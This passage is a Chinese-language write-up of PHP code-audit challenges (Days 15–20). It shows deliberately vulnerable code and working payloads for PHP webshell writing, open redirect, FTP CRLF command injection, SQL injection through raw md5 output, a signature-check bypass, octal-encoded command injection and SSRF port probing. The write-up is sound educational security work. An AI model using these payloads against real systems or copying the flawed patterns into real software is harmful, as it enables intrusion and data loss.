<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_export ( mixed $expression [, bool $return ] ) : mixed</span><br><span class="line">此函数返回关于传递给该函数的变量的结构信息，它和 var_dump() 类似，不同的是其返回的表示是合法的 PHP 代码。</span><br><span class="line">您可以通过将函数的第二个参数设置为 TRUE，从而返回变量的表示。</span><br></pre></td></tr></table></figure>
<h3 id="漏洞验证-3"><a href="#漏洞验证-3" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=../../var/www/html/test/shell.php&amp;t1=1%22%3C%3Fphp%20phpinfo%28%29%3F%3E%224</span><br></pre></td></tr></table></figure>
<h2 id="Day-15-Sleigh-Ride"><a href="#Day-15-Sleigh-Ride" class="headerlink" title="Day 15 - Sleigh Ride"></a>Day 15 - Sleigh Ride</h2><h3 id="漏洞代码-4"><a href="#漏洞代码-4" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Redirect</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $websiteHost = <span class="string">'www.example.com'</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">setHeaders</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">    $url = urldecode($url);</span><br><span class="line">    header(<span class="string">"Location: $url"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">startRedirect</span><span class="params">($params)</span> </span>&#123;</span><br><span class="line">    $parts = explode(<span class="string">'/'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>]);</span><br><span class="line">    $baseFile = end($parts);</span><br><span class="line">    $url = sprintf(</span><br><span class="line">      <span class="string">"%s?%s"</span>,</span><br><span class="line">      $baseFile,</span><br><span class="line">      http_build_query($params)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">$this</span>-&gt;setHeaders($url);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'redirect'</span>]) &#123;</span><br><span class="line">  (<span class="keyword">new</span> Redirect())-&gt;startRedirect($_GET[<span class="string">'params'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码处理自身的url路径来得到下一步需要跳转的url，通过<code>explode</code>函数分割url，再通过<code>end</code>函数得到最后一个文件的路径。可以做以下测试：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(explode('/', 'http://www.test.com/index.php'));</span><br><span class="line">array(4) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) "http:"</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(0) ""</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(12) "www.test.com"</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(9) "index.php"</span><br><span class="line">&#125;</span><br><span class="line">php &gt; var_dump(explode('/', 'http://www.test.com/www.hacker.com'));</span><br><span class="line">array(4) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) "http:"</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(0) ""</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(12) "www.test.com"</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(14) "www.hacker.com"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因此跳转的路径是可控的，但这样还不能进行跳转，需要加上<code>http</code>协议。</p>
<h3 id="漏洞验证-4"><a href="#漏洞验证-4" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>当对目标的url进行一次编码时会报错，需要进行两次url编码。进行二次编码之后，<code>index.php/http%253A%252f%252fwww.vulnspy.com?redirect=1</code>,经过<code>$baseFile = end($parts);</code>得到的就是<code>http%3A%2f%2fwww.vulnspy.com</code>。最后进入到<code>$url = urldecode($url);header(&quot;Location: $url&quot;);</code>，最终跳转的目录就是<code>http://www.vulnspy.com?</code>,这样就可以完成任意网站的跳转了。</p>
<h2 id="Day-16-Poem"><a href="#Day-16-Poem" class="headerlink" title="Day 16 - Poem"></a>Day 16 - Poem</h2><h3 id="漏洞代码-5"><a href="#漏洞代码-5" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FTP</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $sock;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($host, $port, $user, $pass)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;sock = fsockopen($host, $port);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;login($user, $pass);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;cleanInput();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mode($_REQUEST[<span class="string">'mode'</span>]);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;send($_FILES[<span class="string">'file'</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanInput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $_GET = array_map(<span class="string">'intval'</span>, $_GET);</span><br><span class="line">    $_POST = array_map(<span class="string">'intval'</span>, $_POST);</span><br><span class="line">    $_COOKIE = array_map(<span class="string">'intval'</span>, $_COOKIE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">    fwrite(<span class="keyword">$this</span>-&gt;sock, <span class="string">"USER "</span> . $username . <span class="string">"\n"</span>);</span><br><span class="line">    fwrite(<span class="keyword">$this</span>-&gt;sock, <span class="string">"PASS "</span> . $password . <span class="string">"\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">mode</span><span class="params">($mode)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($mode == <span class="number">1</span> || $mode == <span class="number">2</span> || $mode == <span class="number">3</span>) &#123;</span><br><span class="line">      fputs(<span class="keyword">$this</span>-&gt;sock, <span class="string">"MODE $mode\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    fputs(<span class="keyword">$this</span>-&gt;sock, $data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> FTP(<span class="string">'localhost'</span>, <span class="number">21</span>, <span class="string">'user'</span>, <span class="string">'password'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码中<code>cleanInput</code>函数对输入的参数进行了<code>intval</code>处理，但这样依然无法改变<code>$_REQUEST</code>所获取的参数值，因为<code>$_REQUEST</code>是直接从GET，POST 和 COOKIE中取值，不是他们的引用。即使后续<code>GET，POST 和 COOKIE</code>发生了变化，也不会影响<code>$_REQUEST</code>的结果。测试如下（test.php）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FTP</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;cleanInput();</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">    var_dump($_REQUEST);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanInput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $_GET = array_map(<span class="string">'intval'</span>, $_GET);</span><br><span class="line">    $_POST = array_map(<span class="string">'intval'</span>, $_POST);</span><br><span class="line">    $_COOKIE = array_map(<span class="string">'intval'</span>, $_COOKIE);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> FTP();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="string">"id"</span>]=&gt; int(<span class="number">1</span>) &#125; <span class="keyword">array</span>(<span class="number">1</span>) &#123; [<span class="string">"id"</span>]=&gt; string(<span class="number">5</span>) <span class="string">"1test"</span> &#125;</span><br></pre></td></tr></table></figure>
<p>代码中比较mode时使用了弱比较，可以很轻易绕过造成任意文件删除。</p>
<h3 id="漏洞验证-5"><a href="#漏洞验证-5" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mode=1%0a%0dDELETE%20test.file</span><br></pre></td></tr></table></figure>
<h2 id="Day-17-Mistletoe"><a href="#Day-17-Mistletoe" class="headerlink" title="Day 17 - Mistletoe"></a>Day 17 - Mistletoe</h2><h3 id="漏洞代码-6"><a href="#漏洞代码-6" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealSecureLoginManager</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $em;</span><br><span class="line">  <span class="keyword">private</span> $user;</span><br><span class="line">  <span class="keyword">private</span> $password;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $password)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $pass = md5(<span class="keyword">$this</span>-&gt;password, <span class="keyword">true</span>);</span><br><span class="line">    $user = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;user);</span><br><span class="line"></span><br><span class="line">    $queryBuilder = <span class="keyword">$this</span>-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">      -&gt;select(<span class="string">"COUNT(p)"</span>)</span><br><span class="line">      -&gt;from(<span class="string">"User"</span>, <span class="string">"u"</span>)</span><br><span class="line">      -&gt;where(<span class="string">"password = '$pass' AND user = '$user'"</span>);</span><br><span class="line">    $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">    <span class="keyword">return</span> boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addslashes($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = <span class="keyword">new</span> RealSecureLoginManager(</span><br><span class="line">  $_POST[<span class="string">'user'</span>],</span><br><span class="line">  $_POST[<span class="string">'passwd'</span>]</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (!$auth-&gt;isValid()) &#123;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>乍一看这段代码与<code>Day 13 - Turkey Baster</code>上的代码类似，但没有了字符串的截断操作，但是在对密码加密处看到调用了md5函数，并还有类一个选项为true，看一下官方手册：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">md5 ( string $str [, bool $raw_output = FALSE ] ) : string</span><br><span class="line">使用 » RSA 数据安全公司的 MD5 报文算法计算 str 的 MD5 散列值。</span><br><span class="line">str</span><br><span class="line">原始字符串。</span><br><span class="line">raw_output</span><br><span class="line">如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</span><br></pre></td></tr></table></figure>
<p>本地测试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(md5(128, true));</span><br><span class="line">res:string(16) &quot;v�an���l���q��\&quot;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞验证-6"><a href="#漏洞验证-6" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>可见经过md5(str, true)的转换，最后一位会产生反斜杠，造成单引号逃逸，payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=128&amp;user=&apos; or 1%23</span><br></pre></td></tr></table></figure>
<h2 id="Day-18-Sign"><a href="#Day-18-Sign" class="headerlink" title="Day 18 - Sign"></a>Day 18 - Sign</h2><h3 id="漏洞代码-7"><a href="#漏洞代码-7" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JWT</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verifyToken</span><span class="params">($data, $signature)</span> </span>&#123;</span><br><span class="line">    $pub = openssl_pkey_get_public(<span class="string">"file://pub_key.pem"</span>);</span><br><span class="line">    $signature = base64_decode($signature);</span><br><span class="line">    <span class="keyword">if</span> (openssl_verify($data, $signature, $pub)) &#123;</span><br><span class="line">      $object = json_decode(base64_decode($data));</span><br><span class="line">      <span class="keyword">$this</span>-&gt;loginAsUser($object);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> JWT())-&gt;verifyToken($_GET[<span class="string">'d'</span>], $_GET[<span class="string">'s'</span>]);</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>本题目的问题是在于<code>openssl_verify()</code>的错误使用，根据php手册说明：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl_verify ( string $data , string $signature , mixed $pub_key_id [, mixed $signature_alg = OPENSSL_ALGO_SHA1 ] ) : int</span><br><span class="line">openssl_verify() 使用与pub_key_id关联的公钥验证指定数据data的签名signature是否正确。这必须是与用于签名的私钥相对应的公钥。</span><br><span class="line">如果签名正确返回 1, 签名错误返回 0, 内部发生错误则返回-1.</span><br></pre></td></tr></table></figure>
<p>但是在<code>if</code>判断中得到的结果是True，if判断只有遇到<code>0</code>或者是<code>false</code>返回的才是<code>false</code>。所以如果能够使得<code>openssl_verify()</code>出错返回<code>-1</code>就能够绕过验证。</p>
<h3 id="漏洞验证-7"><a href="#漏洞验证-7" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>如果让<code>openssl_verify()</code>出错呢？我们使用一个其他的<code>pub_key.pem</code>来生成<code>data</code>和<code>signature</code>,这样就可以使得<code>openssl_verify()</code>返回-1。在本题中既然已经知道了<code>openssl_verify()</code>返回结果，我们可以使用<code>if(openssl_verify()===1)</code>来避免被绕过。</p>
<h2 id="Day-19-Birch"><a href="#Day-19-Birch" class="headerlink" title="Day 19 - Birch"></a>Day 19 - Birch</h2><h3 id="漏洞代码-8"><a href="#漏洞代码-8" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageViewer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $file;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;file = <span class="string">"images/$file"</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;createThumbnail();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">createThumbnail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $e = stripcslashes(</span><br><span class="line">      preg_replace(</span><br><span class="line">        <span class="string">'/[^0-9\\\]/'</span>,</span><br><span class="line">        <span class="string">''</span>,</span><br><span class="line">        <span class="keyword">isset</span>($_GET[<span class="string">'size'</span>]) ? $_GET[<span class="string">'size'</span>] : <span class="string">'25'</span></span><br><span class="line">      )</span><br><span class="line">    );</span><br><span class="line">    system(<span class="string">"/usr/bin/convert $this-&gt;file --resize $e</span></span><br><span class="line"><span class="string">      ./thumbs/$this-&gt;file"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"&lt;a href=$this-&gt;file&gt;</span></span><br><span class="line"><span class="string">      &lt;img src=./thumbs/$this-&gt;file&gt;&lt;/a&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> ImageViewer(<span class="string">"image.png"</span>));</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-8"><a href="#漏洞分析-8" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>代码中唯一可控的点为<code>size</code>，但是经过了<code>preg_replace</code>的替换，非<code>0-9</code>或<code>\</code>都将替换为空，在system函数出不太好进行命令执行，但之后又经过了stripcslashes函数的处理，。首先来看一下stripcslashes函数的作用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stripcslashes ( string $str ) : string</span><br><span class="line">返回反转义后的字符串。可识别类似 C 语言的 \n，\r，... 八进制以及十六进制的描述。</span><br></pre></td></tr></table></figure>
<p>测试如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(stripcslashes(&apos;0\073\163\154\145\145\160\0405\073&apos;));</span><br><span class="line">string(10) &quot;0;sleep 5;&quot;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞验证-8"><a href="#漏洞验证-8" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>通过上面的测试，发现<code>stripcslashes</code>刚好把八进制转为了字符串，输入中又没有存在字母的情况，payload为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0\073\163\154\145\145\160\0405\073</span><br></pre></td></tr></table></figure>
<p>那么最终能够执行的命令就是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/convert images/image.png --resize 0;sleep 5; ./thumbs/image.png</span><br></pre></td></tr></table></figure>
<h2 id="Day-20-Stocking"><a href="#Day-20-Stocking" class="headerlink" title="Day 20 - Stocking"></a>Day 20 - Stocking</h2><h3 id="漏洞代码-9"><a href="#漏洞代码-9" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">set_error_handler(<span class="function"><span class="keyword">function</span> <span class="params">($no, $str, $file, $line)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> ErrorException($str, <span class="number">0</span>, $no, $file, $line);</span><br><span class="line">&#125;, E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageLoader</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getResult</span><span class="params">($uri)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!filter_var($uri, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'&lt;p&gt;Please enter valid uri&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      $image = file_get_contents($uri);</span><br><span class="line">      $path = <span class="string">"./images/"</span> . uniqid() . <span class="string">'.jpg'</span>;</span><br><span class="line">      file_put_contents($path, $image);</span><br><span class="line">      <span class="keyword">if</span> (mime_content_type($path) !== <span class="string">'image/jpeg'</span>) &#123;</span><br><span class="line">      unlink($path);</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'&lt;p&gt;Only .jpg files allowed&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">'&lt;p&gt;There was an error: '</span> .</span><br><span class="line">      $e-&gt;getMessage() . <span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> . $path . <span class="string">'" width="100"/&gt;'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="keyword">new</span> ImageLoader())-&gt;getResult($_GET[<span class="string">'img'</span>]);</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-9"><a href="#漏洞分析-9" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>本题目的是问题是在于提供了错误显示，这样就导致可以根据错误信息推断服务器上面的信息，类似于MYSQL中的报错注入。而在本题中则是存在一个SSRF漏洞。分析代码，在代码的最前方有：<code>set_error_handler(function ($no, $str, $file, $line) { throw new ErrorException($str, 0, $no, $file, $line);}, E_ALL);</code>这个就类似于设置如下的代码：<code>error_reporting(E_ALL);ini_set(&#39;display_errors&#39;, TRUE);ini_set(&#39;display_startup_errors&#39;, TRUE);</code>，如此就会包含所有的错误信息。</p>
<p>错误的显示配置加上<code>&#39;There was an error: &#39; .$e-&gt;getMessage() . &#39;&#39;</code>就导致会在页面上显示所有的信息，包括warning信息。</p>
<h3 id="漏洞验证-9"><a href="#漏洞验证-9" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>正常情况下，如果使用<code>file_get_contents(&#39;http://127.0.0.1:80&#39;)</code>显示的仅仅只是<code>warning信息</code>，在正常的PHP页面中是不会显示warning信息的。但是在开启了上述的配置之后，所有的信息都会在页面上显示。这样就导致我们可以通过SSRF来探测内网的端口和服务了。例如：</p>
<ol>
<li>payload可以写为:<code>img=http://127.0.0.1:22</code>，如果出现了<code>There was an error: file_get_contents(http://127.0.0.1:22): failed to open stream: HTTP request failed! SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2</code>，则表示存在openssh的服务。</li>
<li>payload为<code>img=http://127.0.0.1:25</code>,如果出现了<code>There was an error: file_get_contents(http://127.0.0.1:25): failed to open stream: HTTP request failed! 220 ubuntu ESMTP Sendmail 8.15.2/8.15.2/Debian-3; Tue, 26 Dec 2017 07:43:45 -0800; (No UCE/UBE) logging access from: localhost</code>则表示存在SMTP。</li>
<li>如果通过payload访问不存在的端口,<code>img=http://127.0.0.1:30</code>，出现了<code>There was an error: file_get_contents(http://127.0.0.1:30): failed to open stream: Connection refused</code>，则表明30端口没有服务。</li>
</ol>
<p>所以通过这种方式就能够有效地探测内网端口服务了。</p>
